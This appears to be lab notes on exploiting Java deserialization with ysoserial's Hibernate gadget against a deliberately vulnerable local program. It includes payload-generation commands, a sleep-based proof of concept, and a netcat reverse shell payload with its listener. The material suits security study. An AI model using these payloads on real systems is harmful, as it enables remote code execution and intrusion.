#### 5.1. Info

Burp finding - `High: Java Unsafe Deserialization, vulnerable library: Hibernate 5 (DNS) (encoded in Base64)`.

Hibernate 5 is interesting to exploit because it gives arbitrary method invocation.


#### 5.2. Match the Burp scanner payload with the `yseoserial` gadget

```
# payload_str=`grep -r 'Hibernate 5 (DNS)' ~/Java-Deserialization-Scanner | grep -oE '\"rO0AB.*\"' | tr -d '"' | tr -d '\n' | head -c 32`
# options=`java -jar ~/ysoserial.jar 2>&1 | grep -i 'hibernate' | awk '{print $1}'`
# for i in $options; do java -Dhibernate5 -jar ~/ysoserial.jar $i ls 2>/dev/null | base64 | grep -oE $payload_str && echo $i; done
rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1h
Hibernate1
rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1h
Hibernate2
```
Note: this indicates that either payloads might work when `hibernate5` system property is set.

However, `Hibernate1.java` is the only file that checks for `hibernate5` system property.

```java
if ( System.getProperty("hibernate5") != null ) {
	return new String[] {
		"org.hibernate:hibernate-core:5.0.7.Final",
		"aopalliance:aopalliance:1.0",
		"org.jboss.logging:jboss-logging:3.3.0.Final",
		"javax.transaction:javax.transaction-api:1.2"
	};
}
```
File: `https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/Hibernate1.java`


#### 5.3. Project setup (vulnerable application)

a) The following code `/tmp/java_serial/Main.java` simply reads a file that contains a serialized Java steam, attempts to re-build the original Java object:

```java
import java.io.*;

public class Main {
    public static void main(String[] args) throws IOException, ClassNotFoundException {
        if (args.length != 1) return;
        String filename = args[0];
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));
        Object whatever = ois.readObject(); // hereby the vulnerable code
    }
}
```

b) Dependency chain for Hibernate 5:
```
# mkdir -p /tmp/java_serial/lib
# find ~/.m2 -regex ".*hibernate.*core.*5.0.7.*Final.*jar" -exec cp -- "{}" /tmp/java_serial/lib \;
# find ~/.m2 -regex ".*aopalliance.*1.0.*jar" -exec cp -- "{}" /tmp/java_serial/lib \;
# find ~/.m2 -regex ".*jboss.*logging.*3.3.0.*Final.*jar" -exec cp -- "{}" /tmp/java_serial/lib \;
# find ~/.m2 -regex ".*javax.*transaction.*api.*1.2.*jar" -exec cp -- "{}" /tmp/java_serial/lib \;
```

b.1) Download dependencies from Maven repo
```
https://repo1.maven.org/maven2/javax/transaction/javax.transaction-api/1.2/javax.transaction-api-1.2.jar
```

c) Project structure - `/tmp/java_serial`:
```
# tree /tmp/java_serial
/tmp/java_serial
├── hibernate5.serial
├── lib
│   ├── aopalliance-1.0.jar
│   ├── hibernate-core-5.0.7.Final.jar
│   ├── javax.transaction-api-1.2.jar
│   └── jboss-logging-3.3.0.Final.jar
└── Main.java

1 directory, 6 files
```

d) Compiling the program:
```
# javac Main.java # compile as regular Java program
# javac -cp `pwd`/lib/*: Main.java # in case classes from JAR file are imported in the Java program
```


#### 5.4. Exploitation - part 1 (benign)

Note:
- it is enough to provide the gadget JAR as part of the Java Class Path when running the application (similar to WebLogic)
- after running the program, successful exploitation will delay the process as expected (however this will trigger a `NullPointerException`)

a) Generate the `ysoserial` payload for `Hibernate5`:
```
# java -Dhibernate5 -jar ~/ysoserial.jar Hibernate1 "sleep 5" > /tmp/java_serial/hibernate5.serial
```

b) Exploitation - PoC:
```
# time java -cp `pwd`/lib/*: Main hibernate5.serial 2>/dev/null

real	0m5.462s
user	0m0.680s
sys	0m0.068s
```


#### 5.5. Exploitation - part 2 (reverse shell)

a) Generate the `ysoserial` payload for `Hibernate5`:
```
# java -Dhibernate5 -jar ~/ysoserial.jar Hibernate1 "nc 127.0.0.1 9999 -e /bin/bash" > /tmp/java_serial/hibernate5.serial
```

b) Exploitation - PoC:
```
# java -cp `pwd`/lib/*: Main hibernate5.serial 2>/dev/null
# nc -nlvp 9999
```


